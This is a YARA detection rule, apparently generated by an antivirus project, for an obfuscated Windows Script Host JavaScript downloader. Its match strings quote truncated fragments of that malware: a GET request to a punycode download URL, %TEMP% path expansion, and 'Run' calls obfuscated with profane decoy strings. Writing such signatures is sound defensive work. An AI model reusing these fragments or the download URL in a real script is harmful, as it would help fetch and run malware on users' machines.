rule sig_20160428_082af3e0cb6a8edcf5a683aea89c6b1f {
  meta:
    description = "datamaliciousorder - file 20160428_082af3e0cb6a8edcf5a683aea89c6b1f.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "68c4826a14ae3e896377894b1d3ea67d2682c94cf10bc09c6b1021882648579a"

  strings:
    $s1  = "CpnYamUhhBeyLioUssWvu[YpfJejGmdOpxWayIftFok](\"G\" + \"ET\", \"http://xn--12ct7bab7ccc0ga4bik3a2b1koa4km8d.com/zmd7jf\", false);" ascii
    $s2  = "function RqhQtfGuiNmtLlmYuiEeq(JwyNdxXfkSseLqzOoiLbk){NbzGdyHlfZxlEwfMioMsz[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s3  = "function QftRnmHqiKdrFywGzdEuh() {return NbzGdyHlfZxlEwfMioMsz[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s4  = "function RqhQtfGuiNmtLlmYuiEeq(JwyNdxXfkSseLqzOoiLbk){NbzGdyHlfZxlEwfMioMsz[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s5  = "var NbzGdyHlfZxlEwfMioMsz = function JoyBkfHesXtkJsdIzkBki() {return QgcUrpXwdZqtFruAesCkt[OytXyvMpxBzhYsgEngSsy](\"WScript\"+\"" ascii
    $s6  = "function NunGmnKjyYjpIibJvkTal(FepJaqTmuQmjMznHlyAsj, PjwIcdOtvCjbQpoSjxWvg){KbwUaaVuyTheZtvOumNsq = KbwUaaVuyTheZtvOumNsq * 1; " ascii
    $s7  = "return FepJaqTmuQmjMznHlyAsj - PjwIcdOtvCjbQpoSjxWvg;};" fullword ascii
    $s8  = "var QgcUrpXwdZqtFruAesCkt = this[\"WScript\"];" fullword ascii
    $s9  = "var NbzGdyHlfZxlEwfMioMsz = function JoyBkfHesXtkJsdIzkBki() {return QgcUrpXwdZqtFruAesCkt[OytXyvMpxBzhYsgEngSsy](\"WScript\"+\"" ascii
    $s10 = "function QftRnmHqiKdrFywGzdEuh() {return NbzGdyHlfZxlEwfMioMsz[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s11 = "if (CpnYamUhhBeyLioUssWvu[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s12 = "function NunGmnKjyYjpIibJvkTal(FepJaqTmuQmjMznHlyAsj, PjwIcdOtvCjbQpoSjxWvg){KbwUaaVuyTheZtvOumNsq = KbwUaaVuyTheZtvOumNsq * 1; " ascii
    $s13 = "function OcyFmyNzrAgzAybKgzCkg(){return WacBwrGbmVunEzjJcnDmt + \"\";};" fullword ascii
    $s14 = "function XwiHwfIzaHwpPmrIvuFch() {return ((NcqGlmMhtOzwVcmLeiLob == true) && (NcqGlmMhtOzwVcmLeiLob == IgkByaAzzBkfDphRbzWau)) ?" ascii
    $s15 = "function XwiHwfIzaHwpPmrIvuFch() {return ((NcqGlmMhtOzwVcmLeiLob == true) && (NcqGlmMhtOzwVcmLeiLob == IgkByaAzzBkfDphRbzWau)) ?" ascii
    $s16 = "}while (XyxGloMymOstVasNhzXya);" fullword ascii
    $s17 = "function BrsIawMsrFvyJkvHhwAvz(){return 23;};" fullword ascii
    $s18 = "function IvtVnhXxfEadJheEkaUkq()" fullword ascii
    $s19 = "function UfiMqxDjsGlxMxvLfsJju(ZqeBwoQweNolNdcCnkChe) {var KwnSglUdfVdmXlwNboJyl = (1, 2, 3, 4, 5, ZqeBwoQweNolNdcCnkChe); retur" ascii
    $s20 = "function UfiMqxDjsGlxMxvLfsJju(ZqeBwoQweNolNdcCnkChe) {var KwnSglUdfVdmXlwNboJyl = (1, 2, 3, 4, 5, ZqeBwoQweNolNdcCnkChe); retur" ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}